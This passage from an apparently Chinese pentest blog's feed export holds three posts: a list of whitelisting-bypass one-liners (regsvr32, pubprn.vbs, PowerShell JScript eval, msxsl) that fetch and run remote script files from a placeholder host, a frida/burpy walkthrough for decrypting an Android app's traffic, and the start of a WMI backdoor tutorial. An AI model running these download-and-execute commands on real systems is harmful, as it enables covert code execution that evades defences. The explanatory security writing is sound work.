<p><code>regsvr32 /s /n /u /i: http://url/file.sct scrobj.dll</code></p>
<h4 id="PubPrn"><a href="#PubPrn" class="headerlink" title="PubPrn"></a>PubPrn</h4><p><a href="https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/" title="PubPrn">PubPrn</a></p>
<p><code>pubprn.vbs 127.0.0.1 script:http ://url/file.sct</code></p>
<h4 id="通过PowerShell拼接Microsoft-JScript-Eval"><a href="#通过PowerShell拼接Microsoft-JScript-Eval" class="headerlink" title="通过PowerShell拼接Microsoft.JScript.Eval"></a>通过PowerShell拼接Microsoft.JScript.Eval</h4><p><code>[Reflection.Assembly]::LoadWithPartialName(&#39;Microsoft.JScript&#39;);[Microsoft.JScript.Eval]::JScriptEvaluate(&#39;GetObject(&quot;script: http://url/file.sct&quot;).Exec()&#39;,[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())</code></p>
<h4 id="通过PowerShell拼接Microsoft-VisualBasic-Interaction"><a href="#通过PowerShell拼接Microsoft-VisualBasic-Interaction" class="headerlink" title="通过PowerShell拼接Microsoft.VisualBasic.Interaction"></a>通过PowerShell拼接Microsoft.VisualBasic.Interaction</h4><p><code>[Reflection.Assembly]::LoadWithPartialName(&#39;Microsoft.VisualBasic&#39;);[Microsoft.VisualBasic.Interaction]::GetObject(&#39;script: http://url/file.sct&#39;).Exec(0)</code></p>
<p>值得注意的是，<code>sct</code>并不是唯一一种文件，还有其他的，如：</p>
<h4 id="MsXSL"><a href="#MsXSL" class="headerlink" title="MsXSL"></a>MsXSL</h4><p><a href="https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker" title="MsXSL">MsXSL</a></p>
<p><code>msxsl.exe http://url/file.xml http://url/file.xsl</code></p>
<h4 id="通过PowerShell拼接System-Xml-Xsl-XslCompiledTransform"><a href="#通过PowerShell拼接System-Xml-Xsl-XslCompiledTransform" class="headerlink" title="通过PowerShell拼接System.Xml.Xsl.XslCompiledTransform"></a>通过PowerShell拼接System.Xml.Xsl.XslCompiledTransform</h4><p><code>$s=New-Object System.Xml.Xsl.XsltSettings;$r=New-Object System.Xml.XmlUrlResolver;$s.EnableScript=1;$x=New-Object System.Xml.Xsl.XslCompiledTransform;$x.Load(&#39;http://url/file.xsl&#39;,$s,$r);$x.Transform(&#39;http://url/file.xml&#39;,&#39;z&#39;);del z;</code></p>
]]></content>
      <categories>
        <category>pentest</category>
      </categories>
  </entry>
  <entry>
    <title>加密流量APP的渗透准备</title>
    <url>/pentest/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8FAPP%E7%9A%84%E6%B8%97%E9%80%8F%E5%87%86%E5%A4%87.html</url>
    <content><![CDATA[<h2 id="涉及工具"><a href="#涉及工具" class="headerlink" title="涉及工具"></a>涉及工具</h2><ul>
<li>JEB</li>
<li>DDMS</li>
<li>frida</li>
<li>frida-dexdump</li>
<li>burpy</li>
</ul>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p><img src="/pentest/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8FAPP%E7%9A%84%E6%B8%97%E9%80%8F%E5%87%86%E5%A4%87/2021-01-08-16-33-15.png"></p>
<p>又是喜闻乐见的加密流量！搞它。</p>
<p>APP是加壳的，先上<code>frida-dexdump</code>脱壳。<br><img src="/pentest/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8FAPP%E7%9A%84%E6%B8%97%E9%80%8F%E5%87%86%E5%A4%87/2021-01-08-16-37-29.png"></p>
<p><img src="/pentest/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8FAPP%E7%9A%84%E6%B8%97%E9%80%8F%E5%87%86%E5%A4%87/2021-01-08-16-38-22.png"></p>
<p>这么多有<code>encrypt</code>关键字的，不好找，我们上<code>DDMS</code>：</p>
<p>通过<code>profilling</code>，我们很容易就能定位到加密函数：<br><img src="/pentest/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8FAPP%E7%9A%84%E6%B8%97%E9%80%8F%E5%87%86%E5%A4%87/2021-01-08-16-40-30.png"></p>
<p>上<code>JEB</code>，打开我们已经脱掉的<code>dex</code>文件：</p>
<p><img src="/pentest/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8FAPP%E7%9A%84%E6%B8%97%E9%80%8F%E5%87%86%E5%A4%87/2021-01-08-16-42-17.png"></p>
<p>恩，剩下的就是写脚本了。</p>
<ol>
<li>为方便测试，我们使用burpy，这样就能直接在burpsuite上操作加密解密了。</li>
<li>为方便burpy调用加密和解密，需要把hook写成rpc的形式。</li>
</ol>
<p><code>Talk is cheap, show me the code</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Burpy</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        device = self._get_android_usb_device()</span><br><span class="line">        pid = device.spawn(<span class="string">&quot;xxxx&quot;</span>)</span><br><span class="line">        self.session = device.attach(pid)</span><br><span class="line">        device.resume(pid)</span><br><span class="line">        self.rpc = self._load_rpc()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_get_android_usb_device</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> frida.get_device_manager().enumerate_devices():</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;AOSP&quot;</span> <span class="keyword">in</span> x.name:</span><br><span class="line">                <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_load_rpc</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/run/media/m0nst3r/SSD/work/scripts/xxxx.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            myScript = self.session.create_script(f.read())</span><br><span class="line">            myScript.load()</span><br><span class="line">        <span class="keyword">return</span> myScript.exports</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self,header,body</span>):</span><br><span class="line">        body_json = json.loads(body)</span><br><span class="line">        <span class="keyword">if</span> body.startswith(<span class="string">&#x27;&#123;&quot;request&quot;&#x27;</span>):</span><br><span class="line">            data = body_json.get(<span class="string">&#x27;request&#x27;</span>).get(<span class="string">&#x27;body&#x27;</span>)</span><br><span class="line">            dec_data = self.rpc.dec(data)</span><br><span class="line">            body_json.get(<span class="string">&#x27;request&#x27;</span>).update(&#123;<span class="string">&quot;body&quot;</span>:dec_data&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data = body_json.get(<span class="string">&#x27;response&#x27;</span>)</span><br><span class="line">            dec_data = self.rpc.dec(data)</span><br><span class="line">            body_json.update(&#123;<span class="string">&quot;response&quot;</span>:dec_data&#125;)</span><br><span class="line">        body = json.dumps(body_json)</span><br><span class="line">        <span class="keyword">return</span> header,body</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self,header,body</span>):</span><br><span class="line">        body_json = json.loads(body)</span><br><span class="line">        data = body_json.get(<span class="string">&#x27;request&#x27;</span>).get(<span class="string">&#x27;body&#x27;</span>)</span><br><span class="line">        enc_data = self.rpc.enc(data)</span><br><span class="line">        body_json.get(<span class="string">&#x27;request&#x27;</span>).update(&#123;<span class="string">&quot;body&quot;</span>:enc_data&#125;)</span><br><span class="line">        body = json.dumps(body_json)</span><br><span class="line">        <span class="keyword">return</span> header,body</span><br></pre></td></tr></table></figure>

<p>上面是burpy脚本，主要提供frida脚本的加载和加解密功能函数，主要实现在下面的frida hook的js代码中：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line"></span><br><span class="line">    rpc.<span class="property">exports</span> = &#123;</span><br><span class="line">        <span class="attr">dec</span>: <span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> res = <span class="literal">null</span></span><br><span class="line">            <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">                <span class="keyword">let</span> instance = <span class="literal">null</span></span><br><span class="line">                <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;xxxx.SecurityManager&quot;</span>, &#123;</span><br><span class="line">                    <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">x</span>) &#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;GetAESKey&quot;</span>, x.<span class="title function_">getAesKey</span>())</span><br><span class="line">                        instance = x</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params">x</span>) &#123;&#125;</span><br><span class="line">                &#125;)</span><br><span class="line">                res = instance.<span class="title function_">decypt</span>(data)</span><br><span class="line">            &#125;)</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">enc</span>: <span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> res = <span class="literal">null</span></span><br><span class="line">            <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">                <span class="keyword">let</span> instance = <span class="literal">null</span></span><br><span class="line">                <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;xxxx.SecurityManager&quot;</span>, &#123;</span><br><span class="line">                    <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">x</span>) &#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;GetAESKey&quot;</span>, x.<span class="title function_">getAesKey</span>())</span><br><span class="line">                        instance = x</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params">x</span>) &#123;&#125;</span><br><span class="line">                &#125;)</span><br><span class="line">                res = instance.<span class="title function_">encrypt</span>(data)</span><br><span class="line">            &#125;)</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;,<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>由于目标函数是非静态函数，为了避免类实例化时会随机生成密钥，我们使用<code>Java.choose</code>从内存中查找已经实例化的对象。</p>
<p>另外，使用<code>setTimeout</code>的方式进行hook是为了给壳一些时间，不然会提示找不到目标类。</p>
<h2 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h2><p>配置好Burpy：<br><img src="/pentest/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8FAPP%E7%9A%84%E6%B8%97%E9%80%8F%E5%87%86%E5%A4%87/2021-01-08-16-53-18.png"></p>
<p>可以愉快的渗透了：<br><img src="/pentest/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8FAPP%E7%9A%84%E6%B8%97%E9%80%8F%E5%87%86%E5%A4%87/2021-01-08-16-55-48.png"></p>
]]></content>
      <categories>
        <category>pentest</category>
      </categories>
      <tags>
        <tag>burpsuite</tag>
        <tag>burpy</tag>
      </tags>
  </entry>
  <entry>
    <title>利用WMI构建一个持久化的异步的无文件后门</title>
    <url>/pentest/%E5%88%A9%E7%94%A8WMI%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%8C%81%E4%B9%85%E5%8C%96%E7%9A%84%E5%BC%82%E6%AD%A5%E7%9A%84%E6%97%A0%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8.html</url>
    <content><![CDATA[<blockquote>
<blockquote>
<p>引用转发请注明 “原文来自：m0nst3r@DigApis安全”字样，谢谢！</p>
</blockquote>
</blockquote>
<p>[TOC]</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>随着技术的更新换代，很多技术在Windows系统中被引进和弃用，但是有一种非常强大的技术却保留了下来，自Windows NT 4.0和Windows 95开始就一直延续下来，那就是<code>Windows Management Instrumentation (WMI)</code>，即Windows管理工具。现在所有的Windows系统中都有这个工具，利用它包含的工具集，我们可以管理本地或远程的计算机。</p>
<p>它不仅仅被系统管理员熟知，更因为<code>Stuxnet</code>利用WMI来进行攻击的原因而被广大安全人员所知。由于WMI能够提供系统信息收集，防病毒检测，代码执行，横向移动，持久化和盗取数据的能力而很受黑客的欢迎。</p>
<p>随着黑客越来越多的使用WMI技术，了解WMI知识并为已所用，对防御者来说就非常重要。</p>
<p>这个文章主要向读者介绍WMI的主要功能，攻击者如何使用WMI，如何通过WMI绕过IDS以及如何通过WMI Repository做取证。</p>
<h2 id="WMI-Architecture（架构）"><a href="#WMI-Architecture（架构）" class="headerlink" title="WMI Architecture（架构）"></a>WMI Architecture（架构）</h2><p>WMI是Windows对<code>WBEM</code>和<code>CID</code>标准的实现。两个标准目的是在企业环境中提供一个行业无关的，用于收集和传输<code>Managed Component</code>（管理组件）信息的方法。<br>一个WMI的管理组件可以是一个进程，一个注册表的键，一个安装的服务或一个文件信息，等等。这些标准用来沟通确定实现者应该使用什么方法来<code>query</code>（查询），<code>populate</code>（填充）,<code>structure</code>（构造）,<code>transmit</code>（传输）,<code>perform actions on</code>（执行操作）和<code>consume data</code>（处理数据）。</p>
<p><img src="/images/0cc382012eeccd6edeca756ae59afc08e915b5f6.png" alt="wmi-1.png"></p>
<p>Microsoft有实现可以总结为以下几个部分：</p>
<h3 id="Managed-Components（管理组件）"><a href="#Managed-Components（管理组件）" class="headerlink" title="Managed Components（管理组件）"></a>Managed Components（管理组件）</h3><p>管理组件即WMI的对象，是代表着高度结构化的操作系统数据的<code>Class Instances</code>（类实例）。Microsoft提供了非常多的WMI对象来提供有关系统的信息，比如<code>Win32_Process</code>，<code>Win32_Service</code>，<code>AntiVirusProduct</code>，<code>Win32_StartupCommand</code>等。</p>
<h3 id="Consuming-Data（数据处理）"><a href="#Consuming-Data（数据处理）" class="headerlink" title="Consuming Data（数据处理）"></a>Consuming Data（数据处理）</h3><p>Microsoft提供了一些用来处理WMI数据和执行WMI命令的方法。例如，<code>PowerShell</code>提供给了我们一个非常简单的与PowerShell交互的方式。</p>
<h3 id="Querying-Data（数据查询）"><a href="#Querying-Data（数据查询）" class="headerlink" title="Querying Data（数据查询）"></a>Querying Data（数据查询）</h3><p>所有的WMI对象可以通过一个叫<code>WQL</code>的查询语言来查询，这种语言与SQL相似，能够让我们精细地控制返回给用户的WMI对象。</p>
<h3 id="Populating-Data（数据填充）"><a href="#Populating-Data（数据填充）" class="headerlink" title="Populating Data（数据填充）"></a>Populating Data（数据填充）</h3><p>当用户请求一个WMI对象时，WMI服务（Winmgmt）需要知道请求对象的数据填充方式。这个功能是通过<code>WMI Providers</code>（WMI提供者）来完成的。一个WMI提供者就是一个在注册表中拥有相关<code>GUID</code>的注册表键。WMI提供者在数据填充时，做了大量的动作，比如查询所有进程，枚举注册表键等。</p>
<p>当WMI服务填充一个WMI对象时，会有两种类实例：<code>Dynamic Object</code>（动态对象）和<code>Persistent Object</code>（永久化对象）。<br>动态对象是在进行查询时生成的，例如，Win32_Process就是一个动态对象。<br>永久化对象是存储在<code>CIM Repository</code>（CIM库）中的，默认放在<code>%SystemRoot%\System32\wbem\Repository\OBJECTS.DATA</code>中。</p>
<h3 id="Structuring-Data（构造数据）"><a href="#Structuring-Data（构造数据）" class="headerlink" title="Structuring Data（构造数据）"></a>Structuring Data（构造数据）</h3><p>WMI对象大部分的结构是通过<code>Managed Object Format (MOF)</code>（管理对象格式）文件中描述的。MOF文件使用类似C++的语法来描述WMI对象。<br>当WMI提供者生成原始数据时，MOF文件对提供了这些数据的构造结构。从防御者的角度看，值得注意的是，WMI对象的定义可以不通过MOF文件，攻击者可以通过在CIM库中插入<code>.Net</code>代码来定义。</p>
<h3 id="Transmitting-Data（数据传输）"><a href="#Transmitting-Data（数据传输）" class="headerlink" title="Transmitting Data（数据传输）"></a>Transmitting Data（数据传输）</h3><p>Microsoft提供了两种用于远程传输WMI数据的方法：<code>DCOM</code>和<code>Windows Remote Management (WinRM)</code>。</p>
<h3 id="Performing-Actions（执行操作）"><a href="#Performing-Actions（执行操作）" class="headerlink" title="Performing Actions（执行操作）"></a>Performing Actions（执行操作）</h3><p>一些WMI对象包含一些可执行的方法&#x2F;函数。例如，Win32_Process类的静态函数<code>Create</code>就经常被黑客用来做内网中的横向移动。<br>WMI还提供了一个<code>Eventing System</code>（事件系统），用户可以注册在WMI对象生成，修改或删除时执行的事件处理程序。</p>
<h2 id="WMI-类和命名空间"><a href="#WMI-类和命名空间" class="headerlink" title="WMI 类和命名空间"></a>WMI 类和命名空间</h2><p>操作系统信息是通过WMI对象的方式表示的。一个WMI对象也就是一个WMI类的实例。大多数常用的WMI类在MSDN中都有详细的描述，如Win32_Process类。然而还有很多WMI类并没有文档可查，但是幸运的是，我们可以通过WQL来查询所有的WMI类。</p>
<p>与传统的面向对象编程语言相似，WMI类被分类分层的放在命名空间中。所有的命名空间都是从<code>ROOT</code>命名空间下的，当不指定命名空间进行查询时，Microsoft会使用<code>ROOT\CIMV2</code>作为默认的命名空间。</p>
<p>所有的WMI设置，包括默认命名空间在下面的注册表键中：</p>
<p><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WBEM</code></p>
<p>下面的PowerShell代码会递归查询所有的WMI类及其命名空间：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">function Get-WmiNamespace &#123;</span><br><span class="line">	Param ($Namespace=&#x27;ROOT&#x27;)</span><br><span class="line">	</span><br><span class="line">	Get-WmiObject -Namespace $Namespace -Class __NAMESPACE | ForEach-Object &#123;</span><br><span class="line"><span class="meta prompt_">		($</span><span class="language-bash">ns = <span class="string">&#x27;&#123;0&#125;\&#123;1&#125;&#x27;</span> -f <span class="variable">$_</span>.__NAMESPACE, <span class="variable">$_</span>.Name)</span></span><br><span class="line">		Get-WmiNamespace -Namespace $ns</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">WmiClasses = Get-WmiNamespace | ForEach-Object &#123;</span></span><br><span class="line"><span class="meta prompt_">	$</span><span class="language-bash">Namespace = <span class="variable">$_</span></span></span><br><span class="line">	Get-WmiObject -Namespace $Namespace -List |</span><br><span class="line">		ForEach-Object &#123; $_.Path.Path &#125;</span><br><span class="line">&#125; | Sort-Object -Unique</span><br></pre></td></tr></table></figure>

<p>返回的WMI Class 路径如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__AbsoluteTimerInstruction</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__ACE</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__AggregateEvent</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__ClassCreationEvent</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__ClassDeletionEvent</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__ClassModificationEvent</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__ClassOperationEvent</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__ClassProviderRegistration</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__ConsumerFailureEvent</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__Event</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__EventConsumer</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__EventConsumerProviderRegistration</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__EventDroppedEvent</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__EventFilter</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__EventGenerator</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__EventProviderRegistration</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__EventQueueOverflowEvent</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__ExtendedStatus</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__ExtrinsicEvent</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__FilterToConsumerBinding</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__IndicationRelated</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__InstanceCreationEvent</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="查询WMI"><a href="#查询WMI" class="headerlink" title="查询WMI"></a>查询WMI</h2><p>WMI提供了一种非常直观的语法用来查询WMI对象的实例，类和命名空间，即<code>WQL</code>。WQL查询通常可以分为以下几类：</p>
<ol>
<li>Instance Queries（实例查询）：查询WMI对象实例。</li>
<li>Event Queries（事件查询）：等同于在WMI对象创建&#x2F;修改&#x2F;删除的时候注册一个消息。</li>
<li>Meta Queries（元查询）：元查询用来获取WMI命名空间和类结构的元信息。</li>
</ol>
<h3 id="Instance-Queries"><a href="#Instance-Queries" class="headerlink" title="Instance Queries"></a>Instance Queries</h3><p>这是最常用的WQL查询。基本的格式如下：</p>
<p><code>SELECT [Class property name | *] FROM [CLASS NAME] &lt;WHERE [CONSTRAINT]&gt;</code></p>
<p>例如，下面的查询语句将返回所有可执行文件名中带有<code>chrome</code>的正在运行的进程：</p>
<p><code>SELECT * FROM Win32_Process WHERE Name LIKE &quot;%chrome%&quot;</code></p>
<h3 id="Event-Queries"><a href="#Event-Queries" class="headerlink" title="Event Queries"></a>Event Queries</h3><p>事件查询被用作一种消息机制来监听事件类的触发。通常用来在一个WMI对象实例创建&#x2F;修改&#x2F;删除的时候给用户发送一个消息。根据消息类型是<code>intrinsic</code>（系统自带的）还是<code>extrinsic</code>（第三方的），查询语句格式不同：</p>
<p><code> SELECT [Class property name | *] FROM [INTRINSIC CLASS NAME] WITHIN [POLLING INTERVAL] &lt;WHERE [CONSTRAINT]&gt;</code></p>
<p><code> SELECT [Class property name | *] FROM [EXTRINSIC CLASS NAME]  &lt;WHERE [CONSTRAINT]&gt;</code></p>
<p>下面的查询将在用户登录的时候被执行：<br><code>SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstanceISA &#39;Win32_LogonSession&#39; AND TargetInstance.LogonType=2</code></p>
<p>下面的查询将在用户插入可移除设备时被执行：<br><code>SELECT * FROM Win32_VolumeChangeEvent Where EventType=2</code></p>
<h3 id="Meta-Queries"><a href="#Meta-Queries" class="headerlink" title="Meta Queries"></a>Meta Queries</h3><p>元查询用来查询WMI命名空间和类结构的信息。最常见的用法是用来列举WMI命名空间的类结构。元查询是实例查询的一个子集，但是与对象查询不同的是，我们查询的是类的实例的定义。格式如下：</p>
<p><code>SELECT [Class property name | *] FROM [Meta_Class | SYSTEM CLASS NAME] &lt;WHERE [CONSTRAINT]&gt;</code></p>
<p>下面这个语句会查询所有以<code>WIN32</code>开头的WMI的类：</p>
<p><code>SELECT * FROM Meta_Class WHERE __CLASS LIKE &quot;Win32%&quot;</code></p>
<p>下面这个语句会查询某个命名空间下的所有命名空间：</p>
<p><code>SELECT Name FROM __NAMESPACE</code></p>
<p>注意，当不显示的指定命名空间时，默认的命名空间为<code>ROOT\CIMV2</code>。</p>
<h2 id="与WMI交互"><a href="#与WMI交互" class="headerlink" title="与WMI交互"></a>与WMI交互</h2><p>Microsoft和一些第三方软件开发者为我们提供了许多能够与WMI交互的工具。下面是部分工具的一个不完全的列表：</p>
<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><p>PowerShell是一个非常强大的脚本语言，其中包含很多能够与WMI进行交互的功能。对于<code>PowerShell v3</code>版本来说，有如下：</p>
<ul>
<li>Get-WmiObject</li>
<li>Get-CimAssociatedInstance</li>
<li>Get-CimClass</li>
<li>Get-CimInstance</li>
<li>Get-CimSession</li>
<li>Set-WmiInstance</li>
<li>Set-CimInstance</li>
<li>Invoke-WmiMethod</li>
<li>Invoke-CimMethod</li>
<li>New-CimInstance</li>
<li>New-CimSession</li>
<li>New-CimSessionOption</li>
<li>Register-CimIndicationEvent</li>
<li>Register-WmiEvent</li>
<li>Remove-CimInstance</li>
<li>Remove-WmiObject</li>
<li>Remove-CimSession</li>
</ul>
<p>WMI命令和CIM命令的功能相似，但是在<code>v3</code>版本的PowerShell中，CIM更加的灵活。使用CIM命令最大的好处就是它们可以在<code>WinRM</code>和<code>DCOM</code>协议下工作，而WMI命令只支持<code>DCOM</code>协议。</p>
<p>从攻击者的角度看，专门用来创建&#x2F;修改&#x2F;删除WMI&#x2F;CIM类的命令是不存在的。但是，使用WMI可以很容易的创建WMI类。<br>这篇文章的例子中将主要使用PowerShell，因为它的灵活性，并且攻击者越来越多的使用它。</p>
<h3 id="wmic-exe"><a href="#wmic-exe" class="headerlink" title="wmic.exe"></a>wmic.exe</h3><p><code>wmic.exe</code>是一款非常强大的用来与WMI交互的命令行工具。它有非常多而且方便的WMI对象的别名可使用，可以用来进行更加复杂的查询。<br><code>wmic.exe</code>还能够执行WMI方法，攻击者在做内网横向移动时，用的就是Win32_Process的Create方法。但是有一个限制就是，我们不能执行一个接受内置WMI对象的方法。如果PowerShell不可用，用wmic.exe来做系统信息收集和执行一些基本操作还是可以的，它也是常常被渗透测试员和攻击者使用。</p>
<h3 id="wbemtest-exe"><a href="#wbemtest-exe" class="headerlink" title="wbemtest.exe"></a>wbemtest.exe</h3><p><code>wbemtest.ext</code>是一款强大的图形化工具，是出于诊断工具来设计的。可以用来枚举对象实例，执行查询，注册事件，修改WMI对象和类，本地或远程执行。虽然界面不是非常友好，但是对攻击者来说，在其他工具无法使用时，这个工具还是不错的。<br><img src="/images/92c89cf85b3378be0490310e65809a46f9df895f.png" alt="wmi-2.png"></p>
<h3 id="WMI-Explorer"><a href="#WMI-Explorer" class="headerlink" title="WMI Explorer"></a>WMI Explorer</h3><p>WMI Explorer是Sapien公司开发的一款商业工具，用来查找WMI类。它拥有非常好的界面，并且可以分层浏览WMI库。它不可以连接远程WMI库并执行查询。<br><img src="/images/2fa637c32b47d32ea6504f5d554890aa6600c548.png" alt="wmi-3.png"></p>
<h3 id="CIM-Studio"><a href="#CIM-Studio" class="headerlink" title="CIM Studio"></a>CIM Studio</h3><p>CIM Studio是免费的，来自Microsoft，可以用它方便的浏览WMI库，用来查找WMI类也是不错的。<br><img src="/images/5f0b8d15296e088721e7142188eb46d15330144d.png" alt="wmi-4.png"></p>
<h3 id="Windows-Script-Host-WSH-languages"><a href="#Windows-Script-Host-WSH-languages" class="headerlink" title="Windows Script Host (WSH) languages"></a>Windows Script Host (WSH) languages</h3><p><code>VBScript</code>和<code>JScript</code>，虽然Microsoft提供的这两个脚本语言名声不太好，但是就与WMI交互功能来说，它们还是很强大的。事实上，有一个完整的后门程序就是使用这两种脚本语言开发的，其中使用WMI功能完成了基本的<code>C2 (Command and Control)</code>机制。<br>另外，稍后我们会详细介绍，<code>Event Consumer</code>（事件处理）接口<code>ActiveScriptEventConsumer</code>，只有这两种脚本语言，而这个接口对攻击者和防御者来说都很有价值。<br>不管怎样，在那些没有PowerShell环境的老系统中，VBScript和JScript还是霸主地位。</p>
<h3 id="C-x2F-C-via-IWbem-COM-API"><a href="#C-x2F-C-via-IWbem-COM-API" class="headerlink" title="C&#x2F;C++ via IWbem* COM API"></a>C&#x2F;C++ via IWbem* COM API</h3><p>请自行查看<code>COM API for WMI</code>。如果想详细分析包含WMI功能的恶意软件的话，这个接口对逆向工程师来说也很重要。</p>
<h3 id="NET-using-System-Management-classes"><a href="#NET-using-System-Management-classes" class="headerlink" title=".NET using System.Management classes"></a>.NET using System.Management classes</h3><p>.NET 类库在<code>System.Management</code>命名空间下提供了几个用于与WMI交互的类，使用C#等语言编写起来也很简单。在下面的例子中，这些类会在PowerShell代码中反复使用。</p>
<h3 id="winrm-exe"><a href="#winrm-exe" class="headerlink" title="winrm.exe"></a>winrm.exe</h3><p><code>winrm.exe</code>可以在本地或远程开启WinRM服务的机器上枚举WMI对象实例，调用方法，创建和删除对象实例。winrm.exe也可用来配置WinRM服务。与WMI交互的理想方法是使用CIM命令的PowerShell，但是这个可以作为替代方法。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">winrm invoke Create wmicimv2/Win32_Process @&#123;CommandLine=&quot;notepad.exe&quot;;CurrentDirectory=&quot;C:\&quot;&#125;</span><br><span class="line">winrm enumerate http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_Process</span><br><span class="line">winrm get http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_OperatingSystem</span><br></pre></td></tr></table></figure>

<h3 id="wmic-and-wmis-pth-for-Linux"><a href="#wmic-and-wmis-pth-for-Linux" class="headerlink" title="wmic and wmis-pth for Linux"></a>wmic and wmis-pth for Linux</h3><p><code>wmic</code>是一个用来执行WMI查询的简单的Linux命令行工具，可远程调用Win32_Process的Create方法。wmis还接收NTML哈希。</p>
